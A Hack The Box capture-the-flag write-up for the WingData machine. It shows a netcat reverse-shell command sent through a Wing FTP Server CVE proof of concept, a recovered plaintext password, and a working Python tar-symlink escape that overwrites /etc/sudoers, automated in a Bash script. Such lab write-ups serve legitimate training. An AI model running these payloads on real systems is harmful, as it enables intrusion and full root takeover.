# WingData Write-up

> Hack The Box / CTF write-up  
> Flag values have been intentionally removed.

## Enumeration

I started by scanning the target with Nmap:

```bash
nmap -sSVC -A 10.129.16.254
```

The scan revealed two open ports:

```text
22/tcp open  ssh   OpenSSH 9.2p1 Debian 2+deb12u7
80/tcp open  http  Apache httpd 2.4.66
```

The HTTP service redirected to:

```text
http://wingdata.htb/
```

After adding the hostname to `/etc/hosts`, I continued enumerating the web application and discovered the FTP-related virtual host:

```text
ftp.wingdata.htb
```

## Initial Foothold - Wing FTP Server

The FTP web service was vulnerable to **CVE-2025-47812**. I used the public proof of concept to execute a reverse shell command:

```bash
python3 CVE-2025-47812.py \
  -u http://ftp.wingdata.htb \
  -c "nc 10.10.15.88 4444 -e /bin/sh" \
  -v
```

After obtaining command execution on the server, I inspected the Wing FTP Server user configuration:

```bash
cat /opt/wftpserver/Data/1/users/wacky.xml
```

The configuration contained an account for the user `wacky` and a stored password hash:

```xml
<USER_ACCOUNTS Description="Wing FTP Server User Accounts">
  <USER>
    <UserName>wacky</UserName>
    <EnableAccount>1</EnableAccount>
    <EnablePassword>1</EnablePassword>
    <Password>32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca</Password>
    ...
  </USER>
</USER_ACCOUNTS>
```

The recovered password for the account was:

```text
!#7Blushing^*Bride5
```

I then connected to the host over SSH:

```bash
ssh wacky@wingdata.htb
```

This provided an interactive shell as the `wacky` user.

The user flag was available at this stage, but its value is intentionally omitted from this public write-up.

## Privilege Escalation

The privilege-escalation path involved the backup restoration mechanism available on the system.

A Python payload was created to build a specially crafted TAR archive containing a nested symlink structure. The goal was to escape the intended extraction directory during restoration and overwrite `/etc/sudoers`.

The payload used in the write-up was:

```python
import tarfile
import os
import io

comp = "d" * 247
steps = "abcdefghijklmnop"
path = ""

with tarfile.open("/tmp/backup_9999.tar", mode="w") as tar:
    for i in steps:
        a = tarfile.TarInfo(os.path.join(path, comp))
        a.type = tarfile.DIRTYPE
        tar.addfile(a)

        b = tarfile.TarInfo(os.path.join(path, i))
        b.type = tarfile.SYMTYPE
        b.linkname = comp
        tar.addfile(b)

        path = os.path.join(path, comp)

    linkpath = os.path.join("/".join(steps), "l" * 254)

    l = tarfile.TarInfo(linkpath)
    l.type = tarfile.SYMTYPE
    l.linkname = "../" * len(steps)
    tar.addfile(l)

    e = tarfile.TarInfo("escape")
    e.type = tarfile.SYMTYPE
    e.linkname = linkpath + "/../../../../../../../etc"
    tar.addfile(e)

    f = tarfile.TarInfo("sudoers_link")
    f.type = tarfile.LNKTYPE
    f.linkname = "escape/sudoers"
    tar.addfile(f)

    content = b"wacky ALL=(ALL) NOPASSWD: ALL\n"

    c = tarfile.TarInfo("sudoers_link")
    c.type = tarfile.REGTYPE
    c.size = len(content)
    tar.addfile(c, fileobj=io.BytesIO(content))

print("[+] Exploit created")
```

I executed the script:

```bash
python3 exploit_cve.py
```

This produced:

```text
/tmp/backup_9999.tar
```

The archive was copied into the application's backup directory:

```bash
cp /tmp/backup_9999.tar /opt/backup_clients/backups/
```

The system provided permission to run the backup restoration script with `sudo`, so I restored the malicious archive with:

```bash
sudo /usr/local/bin/python3 \
  /opt/backup_clients/restore_backup_clients.py \
  -b backup_9999.tar \
  -r restore_evil
```

The restore process reported that the archive had been extracted into the staging directory:

```text
[+] Backup: backup_9999.tar
[+] Staging directory: /opt/backup_clients/restored_backups/restore_evil
[+] Extraction completed in /opt/backup_clients/restored_backups/restore_evil
```

Because the crafted archive escaped the intended extraction location, the restored data modified `/etc/sudoers` and granted the `wacky` user passwordless sudo access.

I verified the new permissions with:

```bash
sudo -l
```

The result showed:

```text
User wacky may run the following commands on wingdata:
    (ALL) NOPASSWD: ALL
```

At this point, a root shell could be obtained with:

```bash
sudo su -
```

or:

```bash
sudo -i
```

The root flag was available after privilege escalation, but its value is intentionally omitted.

## Original Automation Script, Cleaned for Publication

The original screenshots also contained a Bash script that automated the SSH connection, archive creation, restore operation, and privilege check. Below is a cleaned English version with all flag-reading commands removed:

```bash
#!/bin/bash

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

TARGET="$1"
USER="wacky"
PASSWORD='!#7Blushing^*Bride5'

if [ -z "$TARGET" ]; then
    echo -e "${RED}[!] Usage: $0 <TARGET_IP>${NC}"
    exit 1
fi

echo -e "${GREEN}[+] Target: $TARGET${NC}"
echo -e "${GREEN}[+] User: $USER${NC}"
echo ""

sshpass -p "$PASSWORD" ssh \
    -o StrictHostKeyChecking=no \
    -o UserKnownHostsFile=/dev/null \
    "$USER@$TARGET" << 'ENDSSH'

echo "[+] Preparing exploit..."

cd /tmp

cat > exploit_cve.py << 'EOF'
import tarfile
import os
import io

comp = 'd' * 247
steps = "abcdefghijklmnop"
path = ""

with tarfile.open("/tmp/backup_9999.tar", mode="w") as tar:
    for i in steps:
        a = tarfile.TarInfo(os.path.join(path, comp))
        a.type = tarfile.DIRTYPE
        tar.addfile(a)

        b = tarfile.TarInfo(os.path.join(path, i))
        b.type = tarfile.SYMTYPE
        b.linkname = comp
        tar.addfile(b)

        path = os.path.join(path, comp)

    linkpath = os.path.join("/".join(steps), "l" * 254)

    l = tarfile.TarInfo(linkpath)
    l.type = tarfile.SYMTYPE
    l.linkname = "../" * len(steps)
    tar.addfile(l)

    e = tarfile.TarInfo("escape")
    e.type = tarfile.SYMTYPE
    e.linkname = linkpath + "/../../../../../../../etc"
    tar.addfile(e)

    f = tarfile.TarInfo("sudoers_link")
    f.type = tarfile.LNKTYPE
    f.linkname = "escape/sudoers"
    tar.addfile(f)

    content = b"wacky ALL=(ALL) NOPASSWD: ALL\n"

    c = tarfile.TarInfo("sudoers_link")
    c.type = tarfile.REGTYPE
    c.size = len(content)
    tar.addfile(c, fileobj=io.BytesIO(content))

print("[+] Exploit created")
EOF

echo "[+] Running exploit..."
python3 exploit_cve.py

echo "[+] Copying backup archive..."
cp backup_9999.tar /opt/backup_clients/backups/

echo "[+] Restoring backup..."
sudo /usr/local/bin/python3 \
    /opt/backup_clients/restore_backup_clients.py \
    -b backup_9999.tar \
    -r restore_evil

echo "[+] Checking sudo privileges..."
sudo -l

ENDSSH

echo ""
echo -e "${GREEN}[+] Operation completed.${NC}"
```

An example run looked like this:

```text
[+] Target: 10.129.18.96
[+] User: wacky
Pseudo-terminal will not be allocated because stdin is not a terminal.

Linux wingdata 6.1.0-42-amd64 x86_64

[+] Preparing exploit...
[+] Running exploit...
[+] Exploit created
[+] Copying backup archive...
[+] Restoring backup...
[+] Backup: backup_9999.tar
[+] Staging directory: /opt/backup_clients/restored_backups/restore_evil
[+] Extraction completed in /opt/backup_clients/restored_backups/restore_evil
[+] Checking sudo privileges...

User wacky may run the following commands on wingdata:
    (ALL) NOPASSWD: ALL

[+] Operation completed.
```

## Attack Path

```text
Nmap
  ↓
wingdata.htb
  ↓
ftp.wingdata.htb
  ↓
Wing FTP Server
  ↓
CVE-2025-47812
  ↓
Remote command execution / shell
  ↓
wacky.xml
  ↓
Recovered wacky credentials
  ↓
SSH as wacky
  ↓
Backup restore functionality
  ↓
Crafted TAR / symlink extraction escape
  ↓
Overwrite /etc/sudoers
  ↓
NOPASSWD sudo
  ↓
root
```

